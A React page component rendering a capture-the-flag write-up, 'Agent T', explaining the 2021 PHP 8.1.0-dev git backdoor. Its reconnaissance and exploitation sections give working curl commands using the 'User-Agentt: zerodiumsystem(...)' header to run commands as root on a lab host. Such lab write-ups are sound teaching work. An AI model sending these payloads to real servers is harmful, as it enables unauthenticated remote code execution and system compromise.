'use client'

import { motion } from 'framer-motion'
import { Shield, X } from 'lucide-react'
import { useState } from 'react'
import Link from 'next/link'
import Image from 'next/image'

export default function AgentTWriteup() {
  const [openImage, setOpenImage] = useState<{ src: string; alt: string } | null>(null)

  return (
    <section className="py-20">
      <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          whileInView={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6 }}
          viewport={{ once: true }}
          className="mb-10"
        >
          <nav className="text-sm text-gray-400 mb-4 overflow-x-auto">
            <Link href="/" className="hover:text-white">Home</Link>
            <span className="mx-2">/</span>
            <Link href="/ctf" className="hover:text-white">CTF</Link>
            <span className="mx-2">/</span>
            <Link href="/ctf/web" className="hover:text-white">Web Exploitation</Link>
            <span className="mx-2">/</span>
            <span className="text-white">Agent T</span>
          </nav>

          <h1 className="text-3xl sm:text-4xl md:text-5xl font-bold mb-2">
            <span className="gradient-text">Agent T</span>
          </h1>
          <div className="text-gray-400 text-sm">Category: Web Exploitation</div>
        </motion.div>

        <div className="glass-effect p-4 sm:p-6 md:p-8 rounded-lg cyber-border relative overflow-hidden">
          <div className="flex items-center gap-3 mb-6">
            <Shield className="h-6 w-6 text-primary-500" />
            <div className="text-gray-300">Writeup</div>
          </div>

          <div className="prose prose-invert max-w-none relative z-20 pointer-events-auto select-text overflow-hidden">
            <h2>Challenge Description</h2>
            <p className="text-gray-300">
              Agent T uncovered this website, which looks innocent enough, but something seems off about how the server responds.
            </p>
            <p className="text-gray-300">
              After deploying the vulnerable machine attached to this task, wait a couple of minutes for it to respond.
            </p>

            <button
              type="button"
              onClick={() => setOpenImage({ src: '/assets/adminT.png', alt: 'Agent T target web interface' })}
              className="mt-3 block rounded-lg overflow-hidden border border-white/10 bg-black/20 focus:outline-none focus:ring-2 focus:ring-primary-500 cursor-zoom-in pointer-events-auto relative z-20 w-full"
              aria-label="Expand Agent T target screenshot"
            >
              <Image
                src="/assets/adminT.png"
                alt="Agent T target web interface"
                width={1400}
                height={900}
                className="w-full h-auto max-w-full object-contain"
              />
            </button>
            <div className="text-gray-400 text-xs mt-1">Initial target surface from Agent T scenario</div>

            <button
              type="button"
              onClick={() => setOpenImage({ src: '/assets/adminDashboard.png', alt: 'Agent T admin dashboard view' })}
              className="mt-3 block rounded-lg overflow-hidden border border-white/10 bg-black/20 focus:outline-none focus:ring-2 focus:ring-primary-500 cursor-zoom-in pointer-events-auto relative z-20 w-full"
              aria-label="Expand admin dashboard screenshot"
            >
              <Image
                src="/assets/adminDashboard.png"
                alt="Agent T admin dashboard view"
                width={1400}
                height={900}
                className="w-full h-auto max-w-full object-contain"
              />
            </button>
            <div className="text-gray-400 text-xs mt-1">Dashboard view shown after initial target page</div>

            <hr className="border-white/10 my-6" />

            <h2>Phase 1 - Reconnaissance</h2>
            <p>
              The first thing you always do is scan the target with Nmap:
            </p>

            <div className="bg-black/40 p-3 rounded-lg border border-white/10 mt-3 overflow-x-auto">
              <pre className="text-xs sm:text-sm text-green-400 whitespace-pre-wrap break-words">
{`nmap --privileged -sV -sC -p- -oN nmapInfo.txt 10.48.131.77`}
              </pre>
            </div>

            <h3 className="mt-6">Flag Breakdown</h3>
            <ul className="text-gray-300">
              <li><code>-sV</code> - version detection (the most important flag here)</li>
              <li><code>-sC</code> - default scripts</li>
              <li><code>-p-</code> - all 65535 ports</li>
              <li><code>-oN</code> - save output to a file</li>
            </ul>

            <div className="bg-black/40 p-3 rounded-lg border border-white/10 mt-3 overflow-x-auto">
              <pre className="text-xs sm:text-sm text-green-400 whitespace-pre-wrap break-words">
{`PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)`}
              </pre>
            </div>

            <p className="mt-3 text-gray-300">
              Only one port is open: HTTP on port 80, running <strong>PHP 8.1.0-dev</strong>. The <code>-dev</code> tag is the immediate red flag. Production servers should never run development builds.
            </p>

            <hr className="border-white/10 my-6" />

            <h2>Phase 2 - Identifying the Vulnerability</h2>
            <p>
              <strong>PHP 8.1.0-dev</strong> points directly to a real-world supply chain attack from March 2021.
            </p>
            <p>
              What happened:
            </p>
            <ul className="text-gray-300">
              <li>Attackers pushed two malicious commits to PHP&apos;s official Git repository while impersonating core developers.</li>
              <li>The code introduced a backdoor triggered by a custom HTTP header named <code>User-Agentt</code> (double <code>t</code>).</li>
              <li>If the header started with <code>zerodiumsystem(</code>, the server executed the payload as a system command.</li>
              <li>The backdoor name referenced Zerodium, likely as misdirection.</li>
            </ul>
            <p className="text-gray-300">
              This is tracked as <strong>EDB-ID: 49933</strong> in Exploit-DB.
            </p>
            <p className="text-gray-300">
              Vulnerability class: <strong>Unauthenticated Remote Code Execution (RCE)</strong>.
            </p>

            <hr className="border-white/10 my-6" />

            <h2>Phase 3 - Exploitation</h2>
            <p>
              The attack surface is a single malicious HTTP header:
            </p>

            <div className="bg-black/40 p-3 rounded-lg border border-white/10 mt-3 overflow-x-auto">
              <pre className="text-xs sm:text-sm text-green-400 whitespace-pre-wrap break-words">
{`curl -s http://10.48.131.77/ -H "User-Agentt: zerodiumsystem('id');" | grep uid`}
              </pre>
            </div>

            <h3 className="mt-6">What&apos;s Happening Here</h3>
            <ul className="text-gray-300">
              <li><code>curl -s</code> - silent mode, suppresses progress output.</li>
              <li><code>-H</code> - sets a custom HTTP header.</li>
              <li><code>User-Agentt</code> - the backdoored header (double <code>t</code>).</li>
              <li><code>zerodiumsystem(&apos;id&apos;)</code> - triggers the backdoor and runs <code>id</code> on the server.</li>
              <li><code>| grep uid</code> - filters useful output from HTML noise.</li>
            </ul>

            <div className="bg-black/40 p-3 rounded-lg border border-white/10 mt-3 overflow-x-auto">
              <pre className="text-xs sm:text-sm text-green-400 whitespace-pre-wrap break-words">
{`uid=0(root) gid=0(root) groups=0(root)`}
              </pre>
            </div>

            <p className="mt-3 text-gray-300">
              The shell command is executed as <strong>root</strong>, meaning full system compromise.
            </p>

            <hr className="border-white/10 my-6" />

            <h2>Phase 4 - Finding and Reading the Flag</h2>
            <div className="bg-black/40 p-3 rounded-lg border border-white/10 mt-3 overflow-x-auto">
              <pre className="text-xs sm:text-sm text-green-400 whitespace-pre-wrap break-words">
{`# Find the flag file
curl -s http://10.48.131.77/ -H "User-Agentt: zerodiumsystem('find / -name flag.txt 2>/dev/null');"

# Read the flag
curl -s http://10.48.131.77/ -H "User-Agentt: zerodiumsystem('cat /flag.txt');"`}
              </pre>
            </div>

            <button
              type="button"
              onClick={() => setOpenImage({ src: '/assets/flag_location.png', alt: 'Finding flag location on compromised target' })}
              className="mt-3 block rounded-lg overflow-hidden border border-white/10 bg-black/20 focus:outline-none focus:ring-2 focus:ring-primary-500 cursor-zoom-in pointer-events-auto relative z-20 w-full"
              aria-label="Expand flag location screenshot"
            >
              <Image
                src="/assets/flag_location.png"
                alt="Finding flag location on compromised target"
                width={1400}
                height={900}
                className="w-full h-auto max-w-full object-contain"
              />
            </button>
            <div className="text-gray-400 text-xs mt-1">Locating flag file path with remote command execution</div>

            <button
              type="button"
              onClick={() => setOpenImage({ src: '/assets/flag.png', alt: 'Flag output after reading /flag.txt' })}
              className="mt-3 block rounded-lg overflow-hidden border border-white/10 bg-black/20 focus:outline-none focus:ring-2 focus:ring-primary-500 cursor-zoom-in pointer-events-auto relative z-20 w-full"
              aria-label="Expand flag output screenshot"
            >
              <Image
                src="/assets/flag.png"
                alt="Flag output after reading /flag.txt"
                width={1400}
                height={900}
                className="w-full h-auto max-w-full object-contain"
              />
            </button>
            <div className="text-gray-400 text-xs mt-1">Final flag extraction from the target</div>

            <div className="mt-8 p-6 rounded-lg border-l-4 border-primary-500 bg-gradient-to-r from-primary-500/5 via-purple-500/5 to-transparent">
              <div className="flex items-start gap-3">
                <div className="flex-shrink-0 w-1 h-full bg-primary-500 rounded-full"></div>
                <div>
                  <p className="text-sm font-medium text-primary-400 mb-1">WEB SECURITY</p>
                  <p className="text-base text-gray-300 leading-relaxed">
                    <span className="italic text-primary-300">&quot;Enumeration reveals attack paths, but version awareness reveals zero-day history. Never trust a dev build in production, and never assume one header cannot break everything.&quot;</span>
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>

        {openImage && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4"
            onClick={() => setOpenImage(null)}
            role="dialog"
            aria-modal="true"
            aria-label="Expanded image preview"
          >
            <div className="relative max-w-5xl w-full" onClick={(e) => e.stopPropagation()}>
              <button
                type="button"
                onClick={() => setOpenImage(null)}
                className="absolute -top-3 -right-3 md:-top-4 md:-right-4 p-2 rounded-full bg-white/10 hover:bg-white/20 border border-white/20 text-white"
                aria-label="Close preview"
              >
                <X className="h-5 w-5" />
              </button>
              <Image
                src={openImage.src}
                alt={openImage.alt}
                width={1600}
                height={1000}
                className="w-full h-auto rounded-lg border border-white/10 shadow-2xl"
              />
            </div>
          </motion.div>
        )}
      </div>
    </section>
  )
}